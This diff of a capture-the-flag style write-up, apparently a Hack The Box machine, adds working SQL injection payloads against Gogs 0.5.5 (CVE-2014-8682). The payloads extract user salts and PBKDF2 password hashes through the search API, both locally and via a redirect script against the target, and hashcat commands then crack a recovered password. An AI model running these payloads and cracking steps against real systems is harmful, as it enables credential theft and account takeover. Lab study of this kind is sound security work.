@@ -96,16 +96,103 @@ Shellcodes: No Results
 looking at the releases in github, it looks like 0.5.8 came right after 0.5.5 to patch those SQLi issues
 ![releases.png](releases.png)
 
-I wanted to install the vulnerable version of gogs localy to be able to test the SQLi without having to worry about the firewall. Because I'm on arm64 I went on a little bit of a tangent, trying to compile gogs, and eventually hit a wall, so I ended up installing it on a amd64 machine directly from a precompiled binary. Even though the process wasn't successfull for me, I still leaarned a great deal about Go.
-Notably, I learned about GVM which essentially is a python pyenv, and lets you manage multiple verions of golang in the same environement: 
+I wanted to install the vulnerable version of gogs localy to be able to test the SQLi without having to worry about the firewall. Because I'm on arm64 I went on a little bit of a tangent, trying to compile gogs, and eventually hit a wall. Even though the process wasn't successfull for me, I still learned a great deal about Go. Notably, I learned about GVM which essentially is a python pyenv, and lets you manage multiple verions of golang in the same environement: 
 ```bash
 bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
-```
-```bash
 gvm install go1.3.2
 ```
-
+In any case I ended up installing it on a remote amd64 machine directly from a precompiled binary.  
 [https://github.com/gogs/gogs/releases/tag/v0.5.5](https://github.com/gogs/gogs/releases/tag/v0.5.5)
+
+looking at that install I could explore the gogs database:  
+```bash
+sqlite3 gogs.db
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter ".help" for usage hints.
+sqlite> .table
+access        hook_task     milestone     public_key    team_user
+action        issue         mirror        release       update_task
+attachment    issue_user    notice        repository    user
+comment       label         oauth2        star          watch
+follow        login_source  org_user      team          webhook
+```
+this is exactly where and how my password gets stored after I create a user  
+```bash
+sqlite> .mode table
+sqlite> select name,salt,passwd from user;
++-------+------------+------------------------------------------------------------------------------------------------------+
+| name  |    salt    |                                                passwd                                                |
++-------+------------+------------------------------------------------------------------------------------------------------+
+| blnkn | LEdiEU0Wob | bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761 |
++-------+------------+------------------------------------------------------------------------------------------------------+
+```
+
+found the code that does the auth in the source  
+```go
+// UserSignIn validates user name and password.
+func UserSignIn(uname, passwd string) (*User, error) {
+	var u *User
+	if strings.Contains(uname, "@") {
+		u = &User{Email: uname}
+	} else {
+		u = &User{LowerName: strings.ToLower(uname)}
+	}
+
+	has, err := x.Get(u)
+	if err != nil {
+		return nil, err
+	}
+
+	if u.LoginType == NOTYPE && has {
+		u.LoginType = PLAIN
+	}
+
+	// For plain login, user must exist to reach this line.
+	// Now verify password.
+	if u.LoginType == PLAIN {
+		newUser := &User{Passwd: passwd, Salt: u.Salt}
+		newUser.EncodePasswd()
+		if u.Passwd != newUser.Passwd {
+			return nil, ErrUserNotExist
+		}
+		return u, nil
+        ...
+        snip
+```
+
+So the actual encryption function is here: 
+```go
+// use pbkdf2 encode password
+func EncodePassword(rawPwd string, salt string) string {
+	pwd := PBKDF2([]byte(rawPwd), []byte(salt), 10000, 50, sha256.New)
+	return hex.EncodeToString(pwd)
+```
+
+which corresponds to this: 
+```bash
+hashcat -h|grep -i pbkdf2|head -4
+  11900 | PBKDF2-HMAC-MD5                                     | Generic KDF
+  12000 | PBKDF2-HMAC-SHA1                                    | Generic KDF
+  10900 | PBKDF2-HMAC-SHA256                                  | Generic KDF
+  12100 | PBKDF2-HMAC-SHA512                                  | Generic KDF
+```
+[https://forum.hashkiller.io/index.php?threads/help-identifying-this-hash.38156/](https://forum.hashkiller.io/index.php?threads/help-identifying-this-hash.38156/)
+found the expected hashcat format in the link above,  
+we need to transform the hex hash to b64  
+```
+printf 'bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761'|xxd -p -r|base64
+vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy5VBKAfhdzZSXc/Jb29x5eZbZuP3Pac5l2E=
+```
+transform the salt to b64  
+```
+printf 'LEdiEU0Wob'|base64
+TEVkaUVVMFdvYg==
+```
+```
+hashcat -m 10900 sha256:5000:<b64-salt>:<b64-hash> wordlist
+hashcat -m 10900 sha256:10000:TEVkaUVVMFdvYg==:vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy5VBKAfhdzZSXc/Jb29x5eZbZuP3Pac5l2E= /usr/share/wordlists/rockyou.txt
+```
+ok, so we now know what we need to extract with the SQLi and how to crack the password
 
 ## CVE-2014-8682
 according to the vulnerability report this is the vulnerable code  
@@ -125,14 +212,99 @@ opt.Keyword + "%'").Find(&us)
     return us, err
 }
 ```
-
-```bash
-http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--
+and that's their proof of concept  
 ```
-```bash
-http://127.0.0.1:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/
+http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
 select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
 null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
-/**/mysql.db/**/where/**/('%25'%3D' 
+/**/mysql.db/**/where/**/('%25'%3D'
 ```
+manipulating it a little to try to make sense of it  
+```bash
+curl "http://192.168.0.73:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/1,1,@@version,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/mysql.db/**/where/**/('%25'%3D'"
+```
+%25 = "%"  
+%3D = "="  
+so "%=%" == True ? not sure what exactly whis was, 
+and it looks like he was using @@version on a mysql.db here, which we aren't dealing with, we're working on a sqlite.db  
+also my understanding of the `/**/` is that it is a comment in SQL like `/*this is a comment*/`  
+And here it's helpful to circumvent not beeing able to use actual spaces?  
+so can we just try to get our salt instead of the mysql @@version thing?  
+```bash
+curl "http://192.168.0.73:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/1,1,@@version,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/mysql.db/**/where/**/('%25'%3D'"
+{
+  "error": "unrecognized token: \"@\"",
+  "ok": false
+}
+```
+```bash
+curl "http://192.168.0.73:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/mysql.db/**/where/**/('%25'%3D'"
+{
+  "error": "no such table: mysql.db",
+  "ok": false
+}
+```
+```bash
+curl -s "http://192.168.0.73:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"|jq .
+{
+  "data": [
+    {
+      "username": "blnkn",
+      "avatar": "//1.gravatar.com/avatar/2294fc4f13b7594fc8e604c9dfe30dfc"
+    },
+    {
+      "username": "bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761",
+      "avatar": "//1.gravatar.com/avatar/1"
+    }
+  ],
+  "ok": true
+}
+```
+Now getting that from the remote, through the redirect  
+```bash
+python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
+10.10.11.176 - - [17/Sep/2022 22:25:18] "GET / HTTP/1.0" 302 -
 
+sO3XIbeW14
+```
+```bash
+python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
+10.10.11.176 - - [17/Sep/2022 22:27:08] "GET / HTTP/1.0" 302 -
+
+66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
+```
+```bash
+printf "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37"|xxd -r -p|base64
+
+ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
+```
+```bash
+printf "sO3XIbeW14"|base64
+c08zWEliZVcxNA==
+```
+```bash
+hashcat -m 10900 sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc= /usr/share/wordlists/rockyou.txt
+
+sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
+Hash.Target......: sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc=
+Time.Started.....: Sat Sep 17 22:31:28 2022 (34 secs)
+Time.Estimated...: Sat Sep 17 22:32:02 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     2077 H/s (5.94ms) @ Accel:64 Loops:512 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 71168/14344385 (0.50%)
+Rejected.........: 0/71168 (0.00%)
+Restore.Point....: 70912/14344385 (0.49%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-9999
+Candidate.Engine.: Device Generator
+Candidates.#1....: fullysick -> citadel
+
+Started: Sat Sep 17 22:31:27 2022
+Stopped: Sat Sep 17 22:32:03 2022
+```
